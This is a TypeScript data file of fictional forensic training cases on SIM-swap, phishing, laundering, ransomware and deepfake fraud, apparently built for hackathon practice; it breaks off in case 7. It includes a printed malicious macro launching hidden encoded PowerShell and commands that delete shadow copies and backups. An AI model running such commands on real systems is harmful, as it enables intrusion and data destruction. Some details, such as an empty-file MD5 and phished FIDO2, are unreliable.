import { CaseStudy } from '../types';

export const caseStudiesData: CaseStudy[] = [
  {
    id: 'case-1',
    caseCode: 'SIM-FRD-2026-08',
    title: 'Operation TwinSignal: High-Value Online Banking Fraud & SIM Swap',
    threatType: 'Financial Cybercrime / Telephony Fraud',
    difficulty: 'Intermediate',
    background: 'A private wealth client reported an unauthorized fund deduction of $148,000 executed across three transactions at 03:15 AM on a Sunday. Concurrently, the victim experienced a sudden mobile cellular outage ("No Service") starting at 02:45 AM.',
    incidentDossier: 'Investigators established that an unauthorized e-SIM replacement request was submitted to telecom carrier TelecomOne via social engineering at an authorized retail kiosk at 02:30 AM using a counterfeit driving license. With the duplicate SIM activated on an unverified OnePlus 11 device (IMEI 86429104...), the attacker requested banking password resets via SMS OTP and dispatched wire transfers to three mule accounts across two cooperative banks.',
    evidenceProvided: [
      {
        id: 'ev-1-1',
        type: 'Financial Record',
        title: 'Core Banking Ledger Excerpt',
        snippet: 'TXN#99410 | 03:15:12 UTC | Amount: $49,000 | From: Acct #10842 (Victim) -> To: Acct #88410 (Beneficiary: Apex Trading LLC) | Device: Android 13 | IP: 185.220.101.44 (Tor Exit Node)\nTXN#99411 | 03:17:40 UTC | Amount: $49,000 | From: Acct #10842 -> To: Acct #90312 (Beneficiary: R. Kumar) | IP: 185.220.101.44\nTXN#99412 | 03:22:04 UTC | Amount: $50,000 | From: Acct #10842 -> To: Acct #44109 (Beneficiary: QuickPay Tech) | IP: 185.220.101.44',
        details: 'All three transfers occurred within 7 minutes from a Tor exit relay with an unfamiliar browser user-agent and new hardware device fingerprint.'
      },
      {
        id: 'ev-1-2',
        type: 'Network Log',
        title: 'Telecom Carrier Provisioning Log',
        snippet: '2026-11-04 02:31:09 UTC | CDR_EVENT: SIM_SWAP_REQUEST | MSISDN: +1-555-019-4820 | IMSI_OLD: 310410092841920 | IMSI_NEW: 310410099418402 | AgentID: RET_STORE_NY41 | OverrideReason: PHYSICAL_ID_VERIFIED_DRIVERS_LIC',
        details: 'Override flag shows the kiosk clerk bypassed automated biometrics by manually asserting physical photo ID verification.'
      },
      {
        id: 'ev-1-3',
        type: 'Financial Record',
        title: 'Mule Account Liquidation Trail',
        snippet: 'Acct #88410 -> Instant P2P crypto exchange buy order for 18.2 ETH within 14 minutes of wire receipt.\nAcct #90312 -> ATM cash withdrawal of $9,500 at Terminal ATM-QUEENS-04.\nAcct #44109 -> Sub-divided across 12 micro-wallet accounts.',
        details: 'Rapid dispersion pattern proves pre-arranged money mule network ready to drain accounts before morning business hours.'
      }
    ],
    investigationObjectives: [
      'Establish the timeline correlation between the carrier SIM swap event and subsequent banking credential resets.',
      'Identify the fraud syndicate’s laundering topology and money mule cash-out vectors.',
      'Issue emergency freeze notifications to recipient banking compliance desks and crypto OTC desks.',
      'Formulate preventive banking security controls (e.g. 24-hour mandatory transaction cooling period post-SIM swap).'
    ],
    questionsToSolve: [
      {
        id: 'q-c1-1',
        question: 'What immediate API integration between telecom operators and banking applications would have prevented this fraud?',
        hint: 'Consider SIM swap state verification before approving high-value OTP transactions.',
        solution: 'Implementation of the GSMA Open Gateway SIM Swap API. The banking application automatically checks if the MSISDN has undergone a SIM replacement within the last 48 hours; if true, high-value transfers and password resets are automatically locked until out-of-band biometric or in-branch verification is performed.'
      },
      {
        id: 'q-c1-2',
        question: 'How can investigators trace the cash-out recipient Acct #88410 on the crypto exchange?',
        hint: 'Exchanges operate under KYC (Know Your Customer) regulations.',
        solution: 'Serve an expedited Law Enforcement Information Request (subpoena) to the centralized cryptocurrency exchange containing the ETH deposit transaction hash, requesting KYC identity documents, login IP logs, connected bank accounts, and linked wallet withdrawal addresses.'
      }
    ],
    suggestedWorkflow: [
      {
        step: 1,
        title: 'Timeline & Evidence Freezing',
        description: 'Correlate telecom provisioning timestamps with banking session logs and request immediate account liens on all beneficiary accounts.',
        recommendedTools: ['Splunk', 'Core Banking Fraud Portal', 'Telecom CDR Analyzer']
      },
      {
        step: 2,
        title: 'Mule Graph Reconstruction',
        description: 'Map fund velocity across beneficiary accounts to isolate cash-out hubs and physical ATM locations.',
        recommendedTools: ['Neo4j', 'Maltego', 'Chainalysis / Elliptic']
      },
      {
        step: 3,
        title: 'Forensic Reporting & Preventive Gating',
        description: 'Draft the criminal incident dossier and recommend telecom-banking cross-verification webhooks.',
        recommendedTools: ['Court Dossier Builder', 'GSMA SIM Swap Protocol Docs']
      }
    ],
    expectedSolution: 'The primary root cause was an unauthorized SIM swap facilitated by physical social engineering at a retail kiosk. The funds were rapidly dispersed into cryptocurrency and physical ATM withdrawals via pre-staged mule accounts. The investigation successfully frozen $50,000 in Acct #44109 before complete dispersion, while establishing automated GSMA SIM-Swap check requirements for banking transfers.',
    ethicalForensicWarning: 'SIMULATION NOTICE: This case scenario is a fictional educational training simulation for hackathon preparation. No real bank accounts or actual personal telephone records are utilized.'
  },
  {
    id: 'case-2',
    caseCode: 'IMP-SOC-2026-14',
    title: 'Operation ShadowBrand: Social Media Executive Impersonation & Typosquatting',
    threatType: 'Brand Impersonation & Phishing',
    difficulty: 'Intermediate',
    background: 'A fast-growing FinTech startup discovered that over 400 of their prospective customers received WhatsApp and LinkedIn direct messages from an account claiming to be the startup’s Chief Investment Officer offering "exclusive seed investment rounds" with guaranteed 35% returns.',
    incidentDossier: 'The threat actor cloned the executive’s public profile photograph, published authentic-looking press releases, and directed victims to a typosquatted domain `paysecure-invest.co` (legitimate domain: `paysecure.io`). The cloned website contained an active credentials harvester and an unhosted Ethereum deposit address.',
    evidenceProvided: [
      {
        id: 'ev-2-1',
        type: 'Domain Record',
        title: 'WHOIS & DNS Record for Typosquatted Domain',
        snippet: 'Domain: paysecure-invest.co\nRegistrar: NameCheap Inc.\nCreated: 2026-11-01 19:42:00 UTC\nName Servers: ns1.dns-parking-anon.ru, ns2.dns-parking-anon.ru\nRegistrant Country: IS (Withheld for Privacy via WithheldForPrivacy.com)\nHosting IP: 194.38.20.15 (Autonomous System: AS49505)',
        details: 'Domain registered only 3 days prior with privacy masking and bulletproof Russian DNS hosting.'
      },
      {
        id: 'ev-2-2',
        type: 'Chat Transcript',
        title: 'Victim WhatsApp Outreach Script',
        snippet: 'Threat Actor: "Hello! This is Marcus Vance, CIO at PaySecure. Due to our Series B expansion, we have opened 50 spots for community angel investors. Minimum allocation $2,000 with monthly dividend distributions. Visit paysecure-invest.co/vip-portal to register your wallet."',
        details: 'The attacker personalized greetings by scraping victims who recently liked the authentic company’s LinkedIn milestone posts.'
      },
      {
        id: 'ev-2-3',
        type: 'EXIF Metadata',
        title: 'Cloned Profile Picture Analysis',
        snippet: 'File: marcus_vance_headshot.jpg\nMD5: d41d8cd98f00b204e9800998ecf8427e\nSoftware: Adobe Photoshop 24.2 (Windows)\nCreate Date: 2026-10-31 14:12:08\nICC Profile: sRGB\nEXIF: UserComment: "Scraped via LinkedIn Public API / Image crop"',
        details: 'Artifacts show the original high-resolution LinkedIn image was compressed and re-saved.'
      }
    ],
    investigationObjectives: [
      'Execute emergency takedown proceedings for the typosquatted domain through the registrar and upstream hosting provider.',
      'Coordinate with LinkedIn and Meta/WhatsApp trust and safety divisions to terminate fraudulent accounts.',
      'Analyze the Ethereum wallet address on public block explorers to calculate victim financial exposure.',
      'Implement proactive brand monitoring and Certificate Transparency stream alerts.'
    ],
    questionsToSolve: [
      {
        id: 'q-c2-1',
        question: 'Under what international trademark policy can brand owners obtain rapid administrative transfer or suspension of infringing domain names?',
        hint: 'ICANN administrative dispute policy.',
        solution: 'Uniform Domain-Name Dispute-Resolution Policy (UDRP) or Uniform Rapid Suspension (URS) through arbitration providers like WIPO or the National Arbitration Forum, citing bad-faith registration and confusing similarity.'
      },
      {
        id: 'q-c2-2',
        question: 'What proactive automated OSINT tool alerts organizations whenever a domain matching their brand is registered?',
        hint: 'Look into Certificate Transparency monitor streams and dnstwist.',
        solution: 'Running tools like `dnstwist` or integrating Certstream to monitor public Certificate Transparency logs in real-time for any new SSL certificates issued containing the brand name substring.'
      }
    ],
    suggestedWorkflow: [
      {
        step: 1,
        title: 'Evidence Preservation & Hash Calculation',
        description: 'Capture WARC archive snapshots of `paysecure-invest.co` and preserve full HTTP request/response headers with cryptographic timestamping.',
        recommendedTools: ['SingleFile', 'curl -sv', 'Wayback Machine Save API']
      },
      {
        step: 2,
        title: 'Registrar Abuse Takedown Notice',
        description: 'Submit an authenticated abuse report citing phishing and financial scam to NameCheap abuse desk and hosting ISP AS49505.',
        recommendedTools: ['APWG Phishing Report', 'Google Safe Browsing Report Portal']
      },
      {
        step: 3,
        title: 'Public Advisement & Social Suspension',
        description: 'Publish a verified fraud warning on authentic channels and coordinate account bans via platform legal channels.',
        recommendedTools: ['Company Twitter/X & LinkedIn Verified Channels']
      }
    ],
    expectedSolution: 'The typosquatted domain was flagged within 4 hours via Google Safe Browsing and suspended by the registrar. Blockchain tracing revealed 6 victims had transferred a combined $14,200 to the attacker wallet. Investigators tagged the illicit wallet across major analytics platforms (Etherscan, Chainalysis), effectively freezing the attacker from offramping via regulated exchanges.',
    ethicalForensicWarning: 'SIMULATION NOTICE: This case scenario is a fictional educational training simulation for hackathon preparation.'
  },
  {
    id: 'case-3',
    caseCode: 'CRY-TUM-2026-22',
    title: 'Operation CoinTumble: Darknet Crypto Laundering & Mixer Analysis',
    threatType: 'Cryptocurrency Laundering / Illicit Finance',
    difficulty: 'Advanced',
    background: 'A healthcare hospital system paid a 45 Bitcoin ($3.1M) ransomware demand to regain access to critical surgical databases. Federal cyber investigators initiated real-time blockchain tracing to track the ransom proceeds before cash-out.',
    incidentDossier: 'The threat group transferred the 45 BTC from the initial ransom wallet through a peel chain of 14 micro-hops, splitting transactions into unequal fragments (0.8 BTC, 1.2 BTC, etc.). A significant portion (22 BTC) was subsequently funneled into an automated CoinJoin / Wasabi mixing protocol to strip heuristic UTXO transaction graph linkages.',
    evidenceProvided: [
      {
        id: 'ev-3-1',
        type: 'Financial Record',
        title: 'Blockchain Transaction Graph Snapshot',
        snippet: 'Deposit TXID: b48f912c4091a0... | 45.00000000 BTC -> Initial Ransom Wallet bc1q9x... \nPeel Hop 1: bc1q9x... -> 5.00000000 BTC to bc1qaa... + 39.99980000 BTC (Change output)\nPeel Hop 2: 39.99980000 BTC -> 4.50000000 BTC to bc1qbb... + 35.49960000 BTC\nMixer Input TXID: 7a9e01... | 22.00000000 BTC sent to Wasabi 100-input CoinJoin transaction pool.',
        details: 'Peel chain exhibited classic "change address" heuristics where the larger remainder loops back while small fractions peel off.'
      },
      {
        id: 'ev-3-2',
        type: 'Network Log',
        title: 'Dark Web Forum Communication Transcript',
        snippet: '[TOR: dread_forum_post_id#8891] User "CryptoSovereign": "Selling clean Monero (XMR) for BTC. 1% commission under 5 BTC, escrow mandatory via Dread PGP. Contact via Session ID: 05fa91..."',
        details: 'Correlated PGP signature matched historical posts advertising cross-chain swaps between Bitcoin and privacy coin Monero.'
      },
      {
        id: 'ev-3-3',
        type: 'Disk Artifact',
        title: 'Seized VPS Server Bash History Excerpt',
        snippet: 'curl -s https://api.blockcypher.com/v1/btc/main/addrs/bc1q9x...\nelectrum --testnet daemon start\npython3 mixer_automated_sweep.py --threshold 2.0 --delay 420 --fee-rate 35\nshred -u -z -n 5 /home/anon/.electrum/wallets/*',
        details: 'The operator used automated Python sweeping scripts with randomized 420-second delays to defeat simple time-correlation heuristics.'
      }
    ],
    investigationObjectives: [
      'Apply blockchain clustering heuristics (Common Input Ownership, Change Address Identification) to unmix peeling chains.',
      'De-anonymize CoinJoin transaction pools using denomination analysis and post-mix address re-use vulnerabilities.',
      'Correlate off-ramp liquidity deposits at regulated centralized cryptocurrency exchanges (VASP).',
      'Issue judicial mutual legal assistance requests to subpoena KYC account holder details for off-ramp wallets.'
    ],
    questionsToSolve: [
      {
        id: 'q-c3-1',
        question: 'What is the "Common Input Ownership Heuristic" in Bitcoin blockchain transaction analysis?',
        hint: 'Think about who controls the private keys when a transaction has multiple input UTXOs.',
        solution: 'The heuristic assumes that all input addresses consumed in a multi-input standard Bitcoin transaction belong to the exact same controlling entity or wallet, because spending them requires signing with the respective private keys.'
      },
      {
        id: 'q-c3-2',
        question: 'What critical operational mistake do cybercriminals frequently make after using a CoinJoin mixer that allows investigators to re-link their identity?',
        hint: 'What happens when they combine multiple mixed outputs into one payment?',
        solution: 'Post-mix consolidation (or address re-use). When the criminal subsequently combines multiple smaller mixed change outputs into a single large transaction to buy luxury assets or deposit into an exchange, the transaction destroys the anonymity set and links all previous inputs back together.'
      }
    ],
    suggestedWorkflow: [
      {
        step: 1,
        title: 'UTXO Graph Parsing',
        description: 'Ingest raw block data, compute peel chain flow velocities, and filter out miner fees.',
        recommendedTools: ['GraphSense', 'BlockSci', 'Custom Python Web3/RPC Script']
      },
      {
        step: 2,
        title: 'CoinJoin Pool Anonymity Set Deconstruction',
        description: 'Track post-mix consolidation transactions where mixed outputs merge into single payment destinations.',
        recommendedTools: ['OXT.me', 'Chainalysis Reactor', 'Maltego Crypto Transforms']
      },
      {
        step: 3,
        title: 'Exchange Subpoena & Asset Forfeiture',
        description: 'Identify the destination Virtual Asset Service Provider (VASP) deposit address and dispatch 18 U.S.C. § 981 forfeiture notices.',
        recommendedTools: ['FinCEN SAR Filing', 'Interpol Red Notice Portal']
      }
    ],
    expectedSolution: 'Although the threat actor attempted to obscure the trail using CoinJoin, they committed a classic operational security failure by consolidating 8 mixed outputs into a single 8.0 BTC deposit address on a regulated European crypto exchange. The exchange complied with an emergency law enforcement freeze order, successfully impounding $540,000 of the stolen funds.',
    ethicalForensicWarning: 'SIMULATION NOTICE: This case scenario is a fictional educational training simulation for hackathon preparation.'
  },
  {
    id: 'case-4',
    caseCode: 'RSM-INC-2026-31',
    title: 'Operation DarkVault: Enterprise Ransomware & Cobalt Strike Infiltration',
    threatType: 'Advanced Persistent Threat (APT) / Ransomware',
    difficulty: 'Advanced',
    background: 'At 05:30 AM, manufacturing conglomerate Apex Industries discovered that 240 servers and 1,800 workstations were encrypted with the extension `.darkvault`. Domain controllers displayed a ransom note demanding 500 Monero within 72 hours, with threats to leak 2 TB of proprietary engineering blueprints.',
    incidentDossier: 'Incident responders isolated the network and determined the initial access occurred 18 days prior when an engineering manager opened a spear-phishing attachment `Apex_Q3_Bonus_Calculation.xlsm`. The macro dropped a lightweight loader that spawned PowerShell, injected a Cobalt Strike Beacon into `spoolsv.exe`, performed Active Directory BloodHound enumeration, and deployed ransomware enterprise-wide via Group Policy Objects (GPO).',
    evidenceProvided: [
      {
        id: 'ev-4-1',
        type: 'Disk Artifact',
        title: 'Malicious Office Document Macro Extraction (Olevba Output)',
        snippet: 'Sub AutoOpen()\n  Dim strCmd As String\n  strCmd = "powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsA..."\n  Shell strCmd, 0\nEnd Sub',
        details: 'Base64 encoded string unrolled to a WebClient download cradle pulling a staged payload from `http://193.106.191.24/stage2.bin`.'
      },
      {
        id: 'ev-4-2',
        type: 'Memory Dump',
        title: 'Volatility 3 Process Memory Inspection (spoolsv.exe)',
        snippet: 'PID: 1420 | Process: spoolsv.exe | Path: C:\\Windows\\System32\\spoolsv.exe\nSuspicious Memory Region: 0x000001f4a10000 (PAGE_EXECUTE_READWRITE)\nInjected DLL Header: 4D 5A 90 00 (MZ Header - Reflective DLL Injection)\nCobalt Strike C2 Config: Port 443 | Beacon Sleep: 60s (Jitter: 20%) | Watermark: 305419896 | User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        details: 'Cobalt Strike malleable C2 profile extracted from injected print spooler memory showing team server IP 45.142.122.88.'
      },
      {
        id: 'ev-4-3',
        type: 'Network Log',
        title: 'Domain Controller Event Viewer Log (Event ID 4672 / 4624)',
        snippet: '2026-10-24 02:18:11 UTC | EventID: 4624 (Successful Logon) | TargetUserName: svc_backup_admin | LogonType: 3 (Network) | WorkstationName: ENG-MGR-LAPTOP | SourceNetworkAddress: 10.14.8.45\n2026-10-24 02:22:45 UTC | EventID: 7045 (New Service Installed) | ServiceName: "ApexHealthMonitor" | ImagePath: "C:\\Windows\\Temp\\enc_payload.exe --encrypt-all"',
        details: 'Attacker dumped LSASS memory on the infected laptop, obtained the plaintext credentials of `svc_backup_admin`, and moved laterally via SMB to push malicious services.'
      }
    ],
    investigationObjectives: [
      'Reconstruct the complete attack lifecycle mapped against MITRE ATT&CK tactics.',
      'Extract the Cobalt Strike C2 server configuration and active watermark for threat actor attribution.',
      'Identify how the attackers compromised the backup systems and whether Volume Shadow Copies (VSS) were deleted.',
      'Formulate containment, Active Directory forest recovery, and golden ticket eradication steps.'
    ],
    questionsToSolve: [
      {
        id: 'q-c4-1',
        question: 'Which Windows command did the ransomware payload execute to prevent local system restore using Volume Shadow Copies?',
        hint: 'Command involves vssadmin or wmic.',
        solution: '`vssadmin.exe delete shadows /all /quiet` or `wmic shadowcopy delete` followed by `bcdedit.exe /set {default} recoveryenabled No` and `wbadmin delete catalog -quiet`.'
      },
      {
        id: 'q-c4-2',
        question: 'Why did the attacker inject their Cobalt Strike beacon into `spoolsv.exe` instead of running it as a standalone executable?',
        hint: 'Consider stealth and process masquerading.',
        solution: 'Process hollowing / DLL injection into legitimate core Windows services (like the Print Spooler `spoolsv.exe`) bypasses basic application whitelisting and hides network connections within a process that is expected to run continuously under SYSTEM privileges.'
      }
    ],
    suggestedWorkflow: [
      {
        step: 1,
        title: 'Host Isolation & Live Memory Triage',
        description: 'Disconnect the network segment physically or at the switch level. Acquire volatile RAM from Patient Zero (`ENG-MGR-LAPTOP`) and Domain Controllers.',
        recommendedTools: ['FTK Imager CLI', 'WinPmem', 'Velociraptor']
      },
      {
        step: 2,
        title: 'Credential Invalidation & Kerberos Reset',
        description: 'Perform a double reset of the `krbtgt` account password across all Domain Controllers to invalidate any Golden/Silver Tickets.',
        recommendedTools: ['Active Directory Users and Computers', 'PowerShell ActiveDirectory Module']
      },
      {
        step: 3,
        title: 'Root Cause & GPO Remediation',
        description: 'Audit and remove malicious Group Policy Objects deployed by the threat actor and rebuild affected systems from offline immutable backups.',
        recommendedTools: ['GPMC.msc', 'YARA Scanner', 'Sysinternals Autoruns']
      }
    ],
    expectedSolution: 'The intrusion originated via an Excel XLSM macro lure, escalating to local SYSTEM via Cobalt Strike injection into `spoolsv.exe`. LSASS memory dumping yielded domain backup credentials used to deploy `.darkvault` ransomware via GPO. The response team performed a double `krbtgt` password reset, removed the malicious GPO, blocked the C2 IP 45.142.122.88, and restored operations from air-gapped immutable backup repositories without paying ransom.',
    ethicalForensicWarning: 'SIMULATION NOTICE: This case scenario is a fictional educational training simulation for hackathon preparation.'
  },
  {
    id: 'case-5',
    caseCode: 'DFK-MED-2026-45',
    title: 'Operation PhantomVoice: Deepfake Audio & Synthetic Video Wire Fraud',
    threatType: 'Generative AI Fraud / Synthetic Media Manipulation',
    difficulty: 'Advanced',
    background: 'The Chief Financial Officer of multinational logistics firm TransGlobal received an urgent Microsoft Teams video call from what appeared to be the corporate Chief Executive Officer, requesting an immediate $380,000 escrow transfer to an offshore legal account to finalize a confidential shipping port acquisition.',
    incidentDossier: 'The video feed appeared authentic but exhibited strange micro-stutters and lighting artifacts along the jawline. Concurrently, a synthesized voice note was received on Telegram repeating the instructions. Forensic analysis subsequently proved that the threat actor utilized a 20-second audio clip scraped from the CEO’s recent public keynote podcast to train a zero-shot voice clone model, coupled with a real-time diffusion face-swapping pipeline.',
    evidenceProvided: [
      {
        id: 'ev-5-1',
        type: 'Disk Artifact',
        title: 'Audio Frequency Spectrogram Analysis (Librosa / Audacity)',
        snippet: 'Sample: ceo_telegram_voicenote.wav\nSample Rate: 24,000 Hz | Channels: 1\nSpectral Analysis: Severe spectral truncation above 7.8 kHz (typical of ElevenLabs / VITS neural vocoder synthesis).\nPitch Contour (F0): Unnatural robotic zero-variance jitter; lack of organic micro-tremors during vocal fry.\nPhase Inconsistency: Phase discontinuities at phoneme boundary transitions between "transfer" and "immediately".',
        details: 'Synthetic audio exhibits distinct lack of natural high-frequency breath sounds and room reverberation.'
      },
      {
        id: 'ev-5-2',
        type: 'Disk Artifact',
        title: 'Video Frame-by-Frame Forensic Crop (OpenCV / MediaPipe)',
        snippet: 'Video: teams_recording_snippet.mp4 (Frame #318 to #342)\nFacial Boundary Blend: Optical flow vectors between frames show spatial warping around the earlobes and collar.\nBiological Signal (rPPG): Photoplethysmography heart-rate pulse wave absent across forehead and cheek skin regions (Flatline pulse: 0.0 BPM).\nBlink Frequency: Zero natural eye blinks over 75 seconds of video stream.',
        details: 'Absence of cardiovascular rPPG pulse waveforms mathematically proves synthetic pixel synthesis.'
      },
      {
        id: 'ev-5-3',
        type: 'Network Log',
        title: 'WebRTC Signaling Log Excerpt',
        snippet: '2026-11-03 14:10:02 UTC | ICE_CONNECTION_STATE: CONNECTED | RemotePeerIP: 104.244.78.212 | VideoCodec: VP9 | VirtualCameraDriver: "OBS-Virtual-Camera" | AudioDriver: "VB-Audio VoiceMeeter VAIO"',
        details: 'The caller utilized virtual camera software and virtual audio cable drivers to inject pre-rendered media directly into the browser WebRTC stream.'
      }
    ],
    investigationObjectives: [
      'Extract forensic spatial and frequency-domain evidence to prove video and audio were synthetically generated.',
      'Demonstrate biological signal verification (rPPG pulse and spontaneous blinking) to judicial authorities.',
      'Trace the WebRTC session IP address and origin host infrastructure.',
      'Establish corporate multi-factor out-of-band authorization protocols for high-value financial transactions.'
    ],
    questionsToSolve: [
      {
        id: 'q-c5-1',
        question: 'What is Remote Photoplethysmography (rPPG) and how does it expose synthetic deepfake videos?',
        hint: 'How does blood circulation affect skin coloration in camera frames?',
        solution: 'rPPG detects microscopic, periodic color variations in human skin caused by blood volume pulses during cardiovascular cardiac cycles. Authentic live video displays subtle rhythmic color changes matching a human heart rate (60–100 BPM); synthetic diffusion deepfakes generate frames without underlying cardiovascular biological continuity.'
      },
      {
        id: 'q-c5-2',
        question: 'What simple operational countermeasure could the CFO have used during the live video call to expose a real-time face swap model?',
        hint: 'Think of actions that break 2D facial landmark alignment.',
        solution: 'Asking the caller to turn their head 90 degrees sideways to show a full profile, or waving a hand or sheet of paper across their face. Real-time face-swap pipelines frequently fail or tear around boundary edges when occluded or viewed at extreme angles.'
      }
    ],
    suggestedWorkflow: [
      {
        step: 1,
        title: 'Acoustic & FFT Spectral Extraction',
        description: 'Generate Fourier Transform spectrograms and Mel-frequency cepstral coefficients (MFCCs) to detect vocoder synthesis cutoffs.',
        recommendedTools: ['Librosa', 'Audacity Spectrogram View', 'Praat Phonetics Suite']
      },
      {
        step: 2,
        title: 'Video Frame & Landmark Alignment',
        description: 'Run frame-by-frame 2D FFT and facial landmark continuity tracking to measure boundary blending artifacts and blink frequency.',
        recommendedTools: ['OpenCV', 'FaceForensics++ Suite', 'MediaPipe Face Mesh']
      },
      {
        step: 3,
        title: 'Forensic Affidavit & Verification Gating',
        description: 'Draft the synthetic media forensic report and institute strict dual-custody verbal verbal passphrases for all wires > $50,000.',
        recommendedTools: ['ISO/IEC 27037 Court Affidavit Template']
      }
    ],
    expectedSolution: 'Forensic evaluation confirmed both audio and video streams were synthetic artifacts generated via zero-shot voice cloning and real-time diffusion face-swapping routed through OBS Virtual Camera. The wire was halted prior to release, preventing a $380,000 loss, and the organization implemented a mandatory out-of-band challenge-response passphrase policy for treasury operations.',
    ethicalForensicWarning: 'SIMULATION NOTICE: This case scenario is a fictional educational training simulation for hackathon preparation.'
  },
  {
    id: 'case-6',
    caseCode: 'SYN-IDT-2026-53',
    title: 'Operation Chimera: Synthetic Identity Ring & Micro-Loan Bust-Out',
    threatType: 'Identity Theft / FinTech Fraud Ring',
    difficulty: 'Intermediate',
    background: 'A digital micro-lending FinTech app flagged 85 simultaneous defaults on unsecured personal loans totaling $425,000. All borrower profiles had been created within the same 6-month window, exhibited pristine credit histories, and shared subtle device fingerprint overlaps.',
    incidentDossier: 'Investigators discovered a organized synthetic identity theft syndicate. The perpetrators paired legitimate Social Security / National ID numbers belonging to children and deceased individuals with fabricated names, fictional employer addresses, and prepaid VOIP telephone numbers. Over 18 months, the syndicate cultivated credit scores by making small timely payments ("piggybacking"), before executing a coordinated "bust-out" borrowing maximum limits across 12 FinTech lending platforms.',
    evidenceProvided: [
      {
        id: 'ev-6-1',
        type: 'Financial Record',
        title: 'Loan Application Cluster Table',
        snippet: 'Applicant Name: David R. Miller | National ID: 941-02-XXXX (Issued 2012, DOB registered: 2011) | Stated Age: 38 years\nApplicant Name: Sarah T. Jenkins | National ID: 941-03-XXXX (Issued 2013, DOB registered: 2012) | Stated Age: 42 years\nPhysical Address for Both: 142 Elm St, Suite 4B, Wilmington, DE (Commercial Mail Receiving Agency / Virtual Mailbox)',
        details: 'The National ID issuance dates reveal the credentials belong to minors under age 14, whereas applicants claimed to be over 35.'
      },
      {
        id: 'ev-6-2',
        type: 'Network Log',
        title: 'Mobile App Device Fingerprinting Telemetry',
        snippet: 'AppSession#10419 | Device: Canvas Fingerprint #a9f012 | Screen: 1080x2400 | Battery: 94% (Charging) | WebGL Renderer: Mali-G78 | IP: 73.190.44.12\nAppSession#10420 | Device: Canvas Fingerprint #a9f012 | Screen: 1080x2400 | Battery: 94% (Charging) | WebGL Renderer: Mali-G78 | IP: 73.190.44.12',
        details: 'Different applicant identities logged in from the exact same physical mobile hardware device within 9 minutes.'
      },
      {
        id: 'ev-6-3',
        type: 'Financial Record',
        title: 'Coordinated Bust-Out Timeline',
        snippet: '2026-10-15: All 85 synthetic accounts simultaneously applied for credit line increases from $1,000 to $5,000.\n2026-10-18 01:00 to 04:00 UTC: 100% of available credit lines drawn down via instant debit card transfers to offshore virtual debit cards.\n2026-10-25: All contact phone numbers permanently disconnected.',
        details: 'Synchronous execution indicates an automated batch script orchestrated the final liquidity bust-out.'
      }
    ],
    investigationObjectives: [
      'Identify the physical nexus and hardware devices used by the synthetic identity operators.',
      'Correlate postal addresses with commercial mail forwarding facilities.',
      'Cluster fraudulent accounts using graph analytics based on shared device hashes, phone VOIP carriers, and IP ranges.',
      'Formulate underwriting identity-verification rules (e.g. cross-referencing ID issuance year with applicant date-of-birth).'
    ],
    questionsToSolve: [
      {
        id: 'q-c6-1',
        question: 'What discrepancy between the National ID/SSN and the applicant data immediately exposed the synthetic identity fraud?',
        hint: 'Compare the ID issuance date with the applicant’s stated age.',
        solution: 'The ID was issued in 2012 to a newborn child, but the applicant claimed to be a 38-year-old adult. Real-time verification with the national civil registry or Social Security Administration (e.g. eCBSV in the US) reveals this birth date mismatch instantly.'
      },
      {
        id: 'q-c6-2',
        question: 'Why do synthetic identity rings spend months making legitimate payments before defaulting?',
        hint: 'What does this do to their credit rating?',
        solution: 'To "nurture" the synthetic credit profile. Generating positive repayment history across 12–18 months builds high credit scores, allowing them to qualify for substantially higher credit limits before executing a catastrophic coordinated "bust-out".'
      }
    ],
    suggestedWorkflow: [
      {
        step: 1,
        title: 'Entity Clustering & Graph Traversal',
        description: 'Run graph clustering algorithms connecting shared device canvas fingerprints, virtual mailbox addresses, and bank routing numbers.',
        recommendedTools: ['Neo4j Cypher', 'Gephi', 'i2 Analyst Notebook']
      },
      {
        step: 2,
        title: 'Subpoena Commercial Mail Receiving Agency (CMRA)',
        description: 'Issue a court order to the virtual mailbox provider to obtain real-world forwarding addresses, credit card billing records, and surveillance video of pickup boxes.',
        recommendedTools: ['Postal Inspection Subpoena', 'USPS Form 1583 Records']
      },
      {
        step: 3,
        title: 'Underwriting Algorithm Calibration',
        description: 'Embed automated Social Security Administration eCBSV lookups and VOIP phone carrier risk gating into the customer onboarding flow.',
        recommendedTools: ['Twilio Carrier Lookup API', 'eCBSV Verification Gateway']
      }
    ],
    expectedSolution: 'Investigators linked all 85 synthetic accounts to a single organized fraud ring operating out of a shared co-working space. Federal agents served search warrants on the virtual mailbox facility and recovered 142 fraudulent debit cards, leading to the arrest of three syndicate coordinators and the prevention of an additional $1.2M in planned bust-out loans.',
    ethicalForensicWarning: 'SIMULATION NOTICE: This case scenario is a fictional educational training simulation for hackathon preparation.'
  },
  {
    id: 'case-7',
    caseCode: 'PHI-QSH-2026-67',
    title: 'Operation VenomCode: Quishing (QR Code Phishing) & Cloud OAuth Hijack',
    threatType: 'Phishing / Cloud Credential & Token Theft',
    difficulty: 'Intermediate',
    background: 'A senior executive at defense contractor AeroDynamics scanned a QR code printed on a physical notice affixed to the company cafeteria coffee machine, titled "Corporate Wellness Benefit - Claim Your $150 Health Stipend". Within 2 hours, the executive’s Microsoft 365 account was compromised, and sensitive defense procurement emails were synced to an external mailbox.',
    incidentDossier: 'The QR code directed the executive’s mobile browser to an Evilginx2 reverse-proxy server masquerading as the company’s Single Sign-On (SSO) Okta login page. The executive authenticated and entered their hardware FIDO2 / push MFA code. The reverse-proxy captured the authenticated session cookie and granted the attacker persistent OAuth authorization without needing to re-authenticate.',
    evidenceProvided: [
      {
        id: 'ev-7-1',
        type: 'Network Log',
        title: 'Microsoft Entra ID (Azure AD) Sign-In Log',
        snippet: '2026-11-02 12:15:33 UTC | App: Office 365 Exchange Online | User: r.carter@aerodynamics.com | ClientApp: Mobile Safari | Status: Success (MFA satisfied by claims in token)\nIP Address: 185.161.248.19 (Frankfurt, Germany - Datacenter IP)\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15\nConditional Access Policy: "Require Compliant Device" - BYPASSED via Session Cookie Hijack',
        details: 'The sign-in occurred from a German data center IP while the executive’s physical cell phone was located in Washington, D.C.'
      },
      {
        id: 'ev-7-2',
